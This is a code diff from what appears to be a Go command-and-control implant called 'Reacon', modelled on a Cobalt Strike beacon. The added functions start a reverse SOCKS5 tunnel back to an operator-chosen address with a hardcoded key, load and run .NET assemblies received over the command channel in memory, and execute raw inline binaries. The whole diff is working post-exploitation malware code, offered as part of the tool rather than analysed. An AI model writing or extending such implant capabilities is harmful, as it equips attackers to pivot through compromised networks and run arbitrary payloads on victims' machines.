@@ -4,13 +4,13 @@ import (
 	"Reacon/pkg/commands"
 	"Reacon/pkg/communication"
 	"Reacon/pkg/config"
+	Proxy "Reacon/pkg/services/proxy"
 	"Reacon/pkg/sysinfo"
 	"Reacon/pkg/utils"
 	"bytes"
 	"crypto/rand"
 	"errors"
 	"fmt"
-	"github.com/shirou/gopsutil/process"
 	"io"
 	"io/ioutil"
 	"math/big"
@@ -19,6 +19,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/shirou/gopsutil/process"
 )
 
 func HideConsole() error {
@@ -442,4 +444,35 @@ func GetFileContent(cmdBuf []byte) ([]byte, error) {
 
 	return []byte("reading file" + filePath), nil
 
+}
+func SocksConnect(cmdBuf []byte) ([]byte, error) {
+	go Proxy.ReverseSocksAgent(string(cmdBuf), "psk", false)
+	return []byte("Start socks5 proxy"), nil
+}
+func SocksClose() ([]byte, error) {
+	Proxy.Session.Close()
+	return []byte("Stop socks5 proxy"), nil
+}
+
+// len(file) || file || args
+func Execute_Assembly(b []byte) ([]byte, error) {
+	buf := bytes.NewBuffer(b)
+	fileLenBytes := make([]byte, 4)
+	buf.Read(fileLenBytes)
+	fileLen := utils.ReadInt(fileLenBytes)
+	fileContent := make([]byte, fileLen)
+	buf.Read(fileContent)
+	args := buf.String()
+	if args == "<nil>" {
+		args = ""
+	}
+
+	result, err := commands.ExecuteAssembly(fileContent, args)
+	return result, err
+
+}
+
+func Inline_bin(b []byte) ([]byte, error) {
+	commands.Inline_Bin(b)
+	return nil, nil
 }
